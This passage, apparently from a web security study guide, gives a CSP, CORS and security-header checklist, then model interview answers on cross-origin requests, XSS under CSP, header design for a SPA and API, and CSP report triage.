- [ ] Set `object-src 'none'` and `base-uri 'self'`
- [ ] Set `frame-ancestors` to prevent clickjacking
- [ ] Add `upgrade-insecure-requests`
- [ ] Configure CSP reporting endpoint
- [ ] Never use `'unsafe-inline'` for `script-src`

### CORS
- [ ] Use explicit origin allowlist — never reflect Origin blindly
- [ ] Include `Vary: Origin` on all CORS responses
- [ ] Never allow `null` origin
- [ ] Only use credentials mode when actually needed
- [ ] Set `Access-Control-Max-Age` to optimize preflight caching

### Bonus Headers
- [ ] Add HSTS with `includeSubDomains` and `preload`
- [ ] Set `X-Content-Type-Options: nosniff`
- [ ] Use `Cross-Origin-Opener-Policy: same-origin` for Spectre protection
- [ ] Set `SameSite=Lax` or `Strict` on all cookies

## 30. FAANG Interview Questions — Master Set

### Conceptual Questions

**Q1: "Walk me through what happens when a browser makes a cross-origin fetch() with credentials."**

> **Answer:** "1) The browser checks if it's a simple request. If not (e.g., has `Authorization` header), it sends a preflight OPTIONS with `Access-Control-Request-Method` and `Access-Control-Request-Headers`. 2) The server must respond with `Access-Control-Allow-Origin: [specific-origin]` (not `*` because credentials are involved), `Allow-Credentials: true`, and the appropriate Allow-Methods/Allow-Headers. 3) Browser caches the preflight per `Max-Age`. 4) Browser sends the actual request with cookies attached. 5) Server processes the request and includes CORS headers in the response. 6) Browser validates that `Allow-Origin` matches, `Allow-Credentials` is true, and that the origin is not `*`. 7) If all checks pass, JavaScript can read the response."

**Q2: "A team wants to add a new third-party analytics script to your site. What security concerns would you raise?"**

> **Answer:** "First, the script will execute with full page privileges — it can read DOM, cookies, localStorage, and make network requests as the page. Second, CSP must allow it — either add the domain to `script-src` (weakens allowlist) or load it via a nonce'd script using `strict-dynamic`. Third, consider Subresource Integrity (`integrity` attribute) to ensure the script hasn't been tampered with. Fourth, check if the script loads additional resources that might need CSP exceptions. Fifth, assess if the vendor can be trusted — a compromised analytics vendor can steal all user data. I'd recommend loading it via a nonce'd wrapper, using SRI, and monitoring CSP reports for any violations it causes."

**Q3: "You discover a stored XSS vulnerability but there's a CSP in place. Can the attacker still do damage?"**

> **Answer:** "It depends on the CSP configuration. If it uses `'unsafe-inline'`, the injected script executes freely — CSP provides no protection. If it uses nonce-based CSP with `strict-dynamic`, the attacker's injected script won't execute because it lacks the correct nonce. However, the attacker might still: 1) Inject HTML to create phishing forms (if `form-action` isn't restricted), 2) Use a `<base>` tag hijack (if `base-uri` isn't locked), 3) Exfiltrate data via dangling markup (inject an open tag to capture subsequent page content as a URL parameter), 4) Find script gadgets in allowed frameworks. A strong CSP significantly raises the bar but isn't foolproof — defense in depth (input validation, output encoding) remains essential."

### Scenario-Based Questions

**Q4: "Design the security headers for a microservices architecture with a React SPA frontend and REST API backend on a different subdomain."**

> **Answer:**
>
> **Frontend (app.example.com):**
> - CSP: `script-src 'nonce-{r}' 'strict-dynamic'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; object-src 'none'`
> - HSTS, X-Content-Type-Options, COOP: same-origin
>
> **API (api.example.com):**
> - CORS: `Access-Control-Allow-Origin: https://app.example.com`, `Allow-Credentials: true`, `Vary: Origin`
> - Preflight caching with `Max-Age: 7200`
> - Explicit `Allow-Methods` and `Allow-Headers` — no wildcards with credentials
> - HSTS, nosniff, `Cross-Origin-Resource-Policy: same-site`
>
> **Cookies:** `SameSite=Lax; Secure; HttpOnly; Path=/; Domain=.example.com` or use `__Host-` prefix.

**Q5: "Your CSP report-uri endpoint is getting thousands of violations per day. How do you triage?"**

> **Answer:** "1) **Group by violated directive** — separate script-src violations (high severity) from style-src (lower). 2) **Filter browser extensions** — extensions inject scripts that trigger violations; check if `source-file` is `chrome-extension://` or `moz-extension://`. 3) **Identify patterns** — if `blocked-uri` points to your own CDN, you likely need to add it to the policy. If it's random external domains, it could be adware on user machines. 4) **Prioritize**: violations from your own code = fix code. Violations from browser extensions = filter out. Violations from unknown scripts = potential XSS — investigate immediately. 5) **Use report-to** API with sampling to reduce volume in production."

---

## 🧠 Quick Mental Model for Interviews

- **SOP** = Browser's default firewall. "You can't read that — it's not your origin."
- **CORS** = The server's permission slip. "Okay browser, let *this specific origin* read my response."
- **CSP** = The page's bouncer. "Only these specific scripts/resources are allowed in."

**SOP prevents the *leak*. CSP prevents the *injection*. CORS is the *controlled exception*.**
